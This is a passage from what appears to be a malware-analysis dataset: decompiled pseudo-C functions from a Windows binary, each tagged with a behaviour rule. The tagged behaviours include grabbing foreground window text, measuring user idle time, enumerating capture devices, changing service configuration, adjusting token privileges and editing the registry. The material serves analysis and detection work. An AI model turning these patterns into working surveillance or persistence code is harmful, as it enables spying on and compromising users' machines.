        "decompiled_code": "\nint32_t __cdecl fcn.004126bf(uint noname_0, int32_t **arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    ppiVar1 = arg_ch;\n    iVar2 = *in_ECX;\n    iVar4 = 0;\n    *arg_ch = NULL;\n    puVar5 = &var_8h;\n    var_ch = in_EDX;\n    iVar2 = (**(iVar2 + 0x28))();\n    if (-1 < iVar2) {\n        iVar2 = -0x7fffbffb;\n        while (iVar3 = (**(*var_8h + 0xc))(var_8h, 1, &arg_ch, &var_10h),  iVar3 == 0) {\n            var_4h = 3;\n            (*(*arg_ch)[9])(arg_ch, &var_4h);\n            if (var_4h == var_ch) {\n                if (iVar4 == 0) {\n                    *ppiVar1 = arg_ch;\n                    return 0;\n                }\n                iVar4 = iVar4 + -1;\n            }\n            (*(*arg_ch)[2])(arg_ch, puVar5);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 345
    },
    "0041290f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041290f(void)\n\n{\n    int16_t *piVar1;\n    uchar uVar2;\n    int16_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint pvarg;\n    int16_t *var_20h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    var_ch = NULL;\n    ppv = NULL;\n    var_4h = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x4145e0, 0, 1, 0x4173f0, &ppv);\n    if ((ppv != NULL) && ((**(*ppv + 0xc))(ppv, 0x4145d0, &var_4h, 0),  var_4h != NULL)) {\n        (**(*var_4h + 0x14))(var_4h);\n        iVar6 = 0;\n        while( true ) {\n            iVar7 = 0;\n            var_10h = 0;\n            iVar5 = (**(*var_4h + 0xc))(var_4h, 1, &var_14h, &var_10h);\n            if ((iVar5 != 0) ||\n               (piVar4 = var_14h + iVar6 * 4,  iVar5 = (**(*piVar4 + 0x24))(piVar4, 0, 0, 0x414560, &var_ch), \n               iVar5 != 0)) break;\n            (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvarg);\n            iVar5 = (**(*var_ch + 0xc))(var_ch, 0x417388, &pvarg, 0);\n            if ((iVar5 != 0) && (iVar5 = (**(*var_ch + 0xc))(var_ch, L\"FriendlyName\", &pvarg, 0),  iVar5 != 0)) break;\n            iVar5 = fcn.00405f53();\n            if (iVar5 == 0) {\n                piVar4 = NULL;\n            }\n            else {\n                piVar4 = fcn.00412bc7();\n            }\n            iVar3 = *var_20h;\n            piVar1 = var_20h;\n            while (iVar3 != 0) {\n                *(piVar4[1] + iVar7 * 2) = iVar3;\n                uVar2 = *piVar1;\n                piVar1 = piVar1 + 1;\n                *(iVar7 + *piVar4) = uVar2;\n                iVar7 = iVar7 + 1;\n                iVar3 = *piVar1;\n            }\n            piVar4[2] = iVar6;\n            fcn.00402481(piVar4);\n            iVar6 = iVar6 + 1;\n        }\n        if (var_4h != NULL) {\n            (**(*var_4h + 8))(var_4h);\n            var_4h = NULL;\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n            ppv = NULL;\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return;\n}\n",
        "token_count": 767
    },
    "00412bf3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412bf3(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    \n    fcn.00412c91(param_1);\n    uVar1 = 0;\n    if (param_1[3] != 0) {\n        do {\n            fcn.00405ca3();\n            if (*(param_1[1] + uVar1 * 4) != 0) {\n                fcn.00412f63();\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_1[3]);\n    }\n    if (*param_1 != 0) {\n        fcn.0041265c();\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 195
    },
    "00412c3f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00412c3f(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    arg_8h[3] = 5;\n    arg_8h[1] = 5;\n    arg_8h[2] = 0;\n    uVar1 = fcn.00405f53();\n    *arg_8h = uVar1;\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            fcn.00405ca3();\n            fcn.00402481(*(*(in_ECX + 4) + uVar2 * 4));\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *(in_ECX + 0xc));\n    }\n    return arg_8h;\n}\n",
        "token_count": 203
    },
    "004028cf": {
        "rules": [
            "check if file exists"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004028cf(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint *lpBuffer;\n    uint uVar2;\n    int32_t arg_8h;\n    uint arg_ch;\n    uint var_20h;\n    uint var_8h;\n    uint pszPath;\n    \n    iVar1 = param_2 + 8;\n    arg_8h = iVar1;\n    fcn.0040362d(iVar1);\n    fcn.00410203(arg_8h, arg_ch);\n    fcn.0040362d(iVar1);\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath);\n    fcn.00405ea5();\n    if (iVar1 == 0) {\n        iVar1 = fcn.004101d1(extraout_ECX, extraout_ECX);\n    }\n    else {\n        iVar1 = fcn.00410192(0x40000000);\n    }\n    if (iVar1 != 0) {\n        fcn.0040304c(param_2 + 0x14);\n        lpBuffer = &var_8h;\n        uVar2 = extraout_ECX_00;\n        fcn.0041013d(lpBuffer);\n        fcn.00403036(lpBuffer, uVar2);\n        fcn.00410125();\n    }\n    fcn.0040feed();\n    return;\n}\n",
        "token_count": 332
    },
    "00405ca3": {
        "rules": [
            "terminate process",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ca3(char param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, 0x414870);\n    if (param_1 == '\\0') {\n        if (pcVar2 != NULL) {\n            (*pcVar2)(0, \"An assertion condition failed\", \"Assert\", 0x2010);\n        }\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(1);\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0040f71f": {
        "rules": [
            "create directory"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040f71f(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHELL32.dll_SHCreateDirectoryExW)(0, *param_1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 64
    },
    "004047ea": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004047ea(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    uint var_224h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 8;\n    (*_sym.imp.USER32.dll_GetLastInputInfo)(&var_ch);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    arg_8h_00 = (iVar1 - var_8h) / 1000;\n    uVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    (*_sym.imp.USER32.dll_GetWindowTextW)(uVar2, &var_224h, 0x100);\n    fcn.004035e5(&var_224h);\n    var_20h = 0;\n    puVar3 = &var_4h;\n    var_24h = 0x15;\n    _var_1ch = ZEXT816(0);\n    uVar2 = arg_8h;\n    fcn.00403740(arg_8h_00);\n    fcn.00403761(arg_8h_00);\n    fcn.00403679(arg_8h_00);\n    fcn.00403665(arg_8h_00, puVar3, uVar2);\n    fcn.00405ea5();\n    return arg_8h;\n}\n",
        "token_count": 361
    },
    "00407cb7": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407cb7(uint arg_8h)\n\n{\n    uint uVar1;\n    \n    if ((*0x54e0c0 == NULL) || (*0x54e098 == NULL)) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x414950);\n        *0x54e0c0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"RtlNtStatusToDosError\");\n        *0x54e098 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"RtlSetLastWin32Error\");\n    }\n    if ((*0x54e0c0 != NULL) && (*0x54e098 != NULL)) {\n        uVar1 = (**0x54e0c0)(arg_8h);\n        (**0x54e098)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "00410c36": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410c36(uint *param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32\", 0x416ea8);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(*param_1, &var_4h);\n    }\n    return var_4h;\n}\n",
        "token_count": 132
    },
    "0041013d": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041013d(uint *lpBuffer)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint lpNumberOfBytesWritten;\n    \n    if (*in_ECX != 0) {\n        fcn.0041026f();\n    }\n    lpNumberOfBytesWritten = 0;\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(in_ECX[2], 0, 0, 2);\n    uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(in_ECX[2], *lpBuffer, lpBuffer[1], &lpNumberOfBytesWritten, 0);\n    if (*in_ECX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[3]);\n    }\n    return uVar1;\n}\n",
        "token_count": 177
    },
    "00410fc3": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410fc3(uint *lpValueName, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    uint lpType;\n    uint lpcbData;\n    \n    lpcbData = 0;\n    lpType = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(*in_ECX, *lpValueName, 0, &lpType, 0, &lpcbData);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401085(lpcbData);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(*in_ECX, *lpValueName, 0, &lpType, iVar1, &lpcbData);\n        if (iVar2 == 0) {\n            fcn.00402f91(iVar1, lpcbData);\n            if (iVar1 != 0) {\n                fcn.00401099(iVar1);\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 244
    },
    "0040d49c": {
        "rules": [
            "get service handle",
            "modify service"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d49c(uint *lpServiceName, uint dwStartType)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    uVar4 = uVar2;\n    if (uVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(uVar2, *lpServiceName, 2);\n        if (iVar3 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n            uVar4 = 0;\n        }\n        else {\n            iVar5 = (*_sym.imp.ADVAPI32.dll_ChangeServiceConfigW)\n                              (iVar3, 0xffffffff, dwStartType, 0xffffffff, 0, 0, 0, 0, 0, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            uVar4 = iVar5 != 0;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n            (*pcVar1)(iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 306
    },
    "0040d58d": {
        "rules": [
            "get service handle"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d58d(uint *lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint pcbBytesNeeded;\n    \n    pcbBytesNeeded = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar2, *lpServiceName, 1);\n        if (iVar3 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        }\n        else {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_QueryServiceConfigW)(iVar3, 0, 0, &pcbBytesNeeded);\n            if ((iVar4 != 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 == 0x7a)) {\n                iVar4 = fcn.00405eff();\n                iVar5 = (*_sym.imp.ADVAPI32.dll_QueryServiceConfigW)(iVar3, iVar4, pcbBytesNeeded, &pcbBytesNeeded);\n                pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                if (iVar5 != 0) {\n                    iVar5 = *(iVar4 + 4);\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                    (*pcVar1)(iVar3);\n                    fcn.00401099(iVar4);\n                    return iVar5;\n                }\n            }\n            pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n            (*pcVar1)(iVar3);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 426
    },
    "00411039": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411039(uint *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX != 0) &&\n       (iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(*in_ECX, *arg_8h, 0, arg_10h, *arg_ch, arg_ch[1]),  iVar1 == 0))\n    {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 125
    },
    "0040f619": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f619(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint PreviousState;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint NewState;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpLuid;\n    uint var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    PreviousState = 0;\n    TokenHandle = 0;\n    _lpLuid = 0;\n    ReturnLength = 0;\n    uStack48 = 0;\n    uStack44 = 0;\n    uStack40 = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 0x28, &TokenHandle);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueW)(0, *param_2, &lpLuid),  iVar1 != 0)) {\n        var_1ch = lpLuid;\n        var_18h = var_ch;\n        NewState = 1;\n        var_14h = 2;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)\n                          (TokenHandle, 0, &NewState, 0x10, &PreviousState, &ReturnLength);\n        if (iVar1 != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 339
    },
    "0040fa1f": {
        "rules": [
            "get memory capacity"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fa1f(void)\n\n{\n    uint lpBuffer;\n    uint32_t var_38h;\n    int32_t var_34h;\n    \n    lpBuffer = 0x40;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(&lpBuffer);\n    return var_38h >> 0x14 | var_34h << 0xc;\n}\n",
        "token_count": 88
    },
    "0040fc7e": {
        "rules": [
            "get hostname"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040fc7e(uint param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpBuffer;\n    uint nSize;\n    \n    nSize = 0x10;\n    puVar2 = &lpBuffer;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetComputerNameW)(&lpBuffer, &nSize);\n    fcn.004035e5(&lpBuffer);\n    return param_1;\n}\n",
        "token_count": 150
    },
    "0040ff0b": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ff0b(uint lpFileName)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n    fcn.00405ea5();\n    return uVar1;\n}\n",
        "token_count": 60
    },
    "00410f31": {
        "rules": [
            "delete registry key"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00410f31(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyW)(0x80000001, *param_2);\n    return iVar1 == 0;\n}\n",
        "token_count": 69
    }
}